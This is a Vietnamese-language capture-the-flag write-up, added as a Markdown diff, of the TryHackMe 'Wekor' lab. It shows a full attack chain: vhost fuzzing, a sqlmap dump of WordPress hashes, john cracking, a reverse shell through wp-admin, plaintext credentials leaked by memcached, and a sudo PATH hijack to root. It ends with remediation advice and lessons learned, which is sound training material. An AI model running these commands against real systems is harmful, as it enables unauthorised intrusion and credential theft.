@@ -1,0 +1,193 @@
+---
+title: 'Wekor'
+description: 'A hidden WordPress subdomain falls to SQL injection and a cracked admin password, then an exposed memcached service and a PATH hijack chain all the way to root.'
+date: 2025-12-01
+platform: tryhackme
+room: 'Wekor'
+roomUrl: 'https://tryhackme.com/room/wekorra'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'wordpress'
+  - 'password-cracking'
+  - 'memcached'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'weak credentials'
+  - 'authenticated remote code execution'
+  - 'insecure privileged service'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Wekor — SQL Injection, Mật Khẩu WordPress Bị Bẻ Khóa, và Rò Rỉ Memcached Dẫn Đến Root**
+
+_Bài viết tường thuật lại phòng "Wekor" trên TryHackMe. Một lỗi SQL injection ở tham số mã giảm giá của trang thương mại điện tử làm rò rỉ toàn bộ database WordPress, mật khẩu admin bị bẻ khóa giúp chúng ta có được shell, và một instance memcached nội bộ lộ ra mật khẩu dạng plaintext của một user khác — người này lại nắm một quyền sudo có thể bị lợi dụng bằng kỹ thuật PATH hijack kinh điển._
+
+> Các flag đã được ẩn đi. Wekor là một phòng lab được TryHackMe cho phép khai thác hợp pháp; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dưới dạng `<redacted>` là giá trị thật trên máy nhưng đã bị giữ lại, không công khai.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một **SQL injection** ở request mã giảm giá của shop làm rò rỉ bảng `wp_users` trong database `wordpress` → bẻ khóa các hash phpass bằng `john` thu được mật khẩu của `wp_yura` → đăng nhập vào **wp-admin** với toàn quyền cho phép chúng ta chèn một **PHP reverse shell qua chính bảng quản trị** → với tư cách `www-data`, chúng ta phát hiện một instance **memcached chỉ chạy nội bộ** lộ ra mật khẩu dạng plaintext của user `Orka` → `su Orka` → một binary `bitcoin` có thể chạy bằng sudo lại gọi `python` theo tên trần thay vì đường dẫn tuyệt đối → **PATH hijack** → root.
+
+SQLi → cracked creds → admin RCE → memcached leak → PATH hijack → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Wekor mở SSH (22) và một site Apache ở cổng 80. Vhost chính (`wekor.thm`) là trang chủ của một shop thương mại điện tử; một vhost thứ hai, được tìm ra bằng fuzzing, phục vụ một bản cài WordPress dưới `/wordpress`.
+
+### **Lỗ hổng: tham số mã giảm giá không xác thực nhưng lại chạm tới SQL**
+
+Thêm sản phẩm vào giỏ hàng rồi áp mã giảm giá sẽ gửi một request POST có tham số được nối trực tiếp vào câu query ở backend — không có tham số hóa, không có escape.
+
+<Callout type="insight">
+
+Biểu mẫu tìm kiếm và liên hệ của site không cho ra gì, nhưng luồng mã giảm giá thì có — chạy request đã bắt được qua `sqlmap` xác nhận tham số này bị inject được, và database phía sau nó không chỉ phục vụ riêng cho shop: đó chính là instance MySQL đang chạy cho cả bản cài WordPress của site.
+
+</Callout>
+
+### **Bước 1 — Recon và tìm virtual host**
+
+```text
+rustscan -t 1500 -a wekor.thm --ulimit=5000 -- -A -sC -sV
+# 22/tcp open ssh   OpenSSH 7.2p2
+# 80/tcp open http  Apache 2.4.18, robots.txt lộ ra /workshop /agent /crawler ...
+```
+
+Fuzz header `Host` phát hiện ra một vhost thứ hai:
+
+```text
+ffuf -H "Host: FUZZ.wekor.thm" -u http://wekor.thm -w subdomains-top1million-5000.txt -fs 23
+# site.wekor.thm  [Status: 200]
+```
+
+Brute-force thư mục trên `site.wekor.thm` thì tìm thấy một bản cài WordPress:
+
+```text
+ffuf -u http://site.wekor.thm/FUZZ -w directory-list-2.3-medium.txt -fc 404
+# wordpress  [Status: 301]
+```
+
+### **Bước 2 — SQL injection làm lộ bảng người dùng WordPress**
+
+Với request mã giảm giá được lưu vào `request.txt`:
+
+```text
+sqlmap -r request.txt -D wordpress -T wp_users -C user_login,user_pass --dump
+# user_login: admin, wp_eagle, wp_jeffrey, wp_yura
+# user_pass:  các hash phpass ($P$...), mỗi tài khoản một hash
+```
+
+### **Bước 3 — bẻ khóa các hash phpass**
+
+```text
+john --format=phpass --wordlist=rockyou.txt hashlist.txt
+# 3/4 hash bẻ được; wp_yura -> <redacted-wp-password>
+```
+
+`wp_yura` hóa ra lại có toàn quyền quản trị trên dashboard WordPress — đúng tài khoản đáng để nhắm tới.
+
+### **Bước 4 — RCE đã xác thực qua bảng quản trị WordPress**
+
+Đăng nhập bằng `wp_yura` với quyền dashboard tối đa cho chúng ta mọi thứ cần để thực thi code: bảng quản trị cho phép admin chỉnh sửa trực tiếp file theme/plugin, nên chỉ cần đặt một web-shell PHP nhỏ qua bảng này rồi gọi lại qua HTTP là có shell.
+
+```text
+nc -lvnp 4444
+# connect từ $IP → uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Bước 5 — một instance memcached nội bộ lộ mật khẩu dạng plaintext**
+
+`/home` không có gì hữu ích với `www-data`, nên bước tiếp theo là kiểm tra những gì chỉ lắng nghe trên loopback:
+
+```text
+netstat -tulpn
+# 127.0.0.1:3010   (app nội bộ)
+# 127.0.0.1:3306   mysql
+# 127.0.0.1:11211  memcached   <-- không xác thực, chỉ loopback
+```
+
+Memcached mặc định không có xác thực. Dump các key của nó cho ra ngay một cặp credential đầy đủ:
+
+```text
+telnet 127.0.0.1 11211
+stats cachedump 1 0
+get username   # -> Orka
+get password   # -> <redacted-orka-password>
+```
+
+```text
+su Orka
+cat user.txt   # -> <redacted-flag>
+```
+
+### **Bước 6 — PATH hijack qua một binary tùy chỉnh chạy được bằng sudo**
+
+```text
+sudo -l
+# (root) /home/Orka/Desktop/bitcoin
+```
+
+Binary `bitcoin` chặn thực thi bằng một màn hỏi mật khẩu. Tải binary về và mở bằng Ghidra giúp tìm ra mật khẩu thật, sau đó chương trình chạy một bước phụ gọi `python` theo tên trần chứ không dùng đường dẫn tuyệt đối:
+
+```text
+mkdir /tmp && cd /tmp
+cat > python <<'EOF'
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x python
+export PATH=/tmp:$PATH
+sudo /home/Orka/Desktop/bitcoin
+# Enter the password: <redacted-cracked-binary-password>
+# Access Granted... -> "python" giả của chúng ta trong /tmp chạy với quyền root
+```
+
+```text
+cat /root/root.txt   # -> <redacted-flag>
+```
+
+### **Mức độ ảnh hưởng**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). Toàn bộ chuỗi khai thác đi từ local đến root mà không cần điều kiện gì đặc biệt, bắt đầu từ một lỗi SQL injection không cần xác thực nằm ngay trong luồng checkout bình thường của shop:
+
+- **SQL injection làm lộ toàn bộ credential WordPress** trên máy.
+- **Một instance memcached nội bộ không xác thực** trao mật khẩu dạng plaintext của một user khác cho bất kỳ process nào trên host.
+- **Một binary sudo giải quyết lệnh phụ theo tên trần** biến một tiện ích được bảo vệ bằng mật khẩu thành khả năng thực thi root không hạn chế cho bất kỳ ai kiểm soát `$PATH`.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Tham số hóa câu query mã giảm giá.** Không bao giờ nối trực tiếp tham số request vào SQL; dùng prepared statement và tài khoản DB theo nguyên tắc least-privilege.
+2. **Giới hạn memcached chỉ ở loopback và bật xác thực** (SASL), và không bao giờ lưu credential dạng plaintext trong tầng cache dù có bị lộ hay không.
+3. **Dùng đường dẫn tuyệt đối trong mọi script mà một binary chạy được bằng** **`sudo`** **gọi tới**, và đặt `secure_path` để PATH của `sudo` không bị user gọi lệnh chi phối.
+
+</Callout>
+
+### **Những điều rút ra**
+
+- **Một tính năng "nhỏ" (mã giảm giá) vẫn là một điểm injection.** Hãy đối xử với mọi tham số chạm tới query giống nhau, bất kể tính năng đó trông có nhỏ đến đâu.
+- **Memcached mặc định không có xác thực** — nếu nó có thể truy cập được, hãy coi như mọi thứ nó lưu đã bị lộ.
+- **PATH hijack vẫn rất phổ biến trong các wrapper** **`sudo`\*\***.\*\* Bất kỳ script nào được root gọi mà không dùng đường dẫn tuyệt đối cho các binary nó gọi tới đều là một nguyên tố leo thang đặc quyền đang chờ bị lợi dụng.
+
+Cảm ơn đã đọc. Wekor là một lời nhắc tốt rằng cái form nhỏ nhất trên trang thường lại là cái không ai chịu tham số hóa.
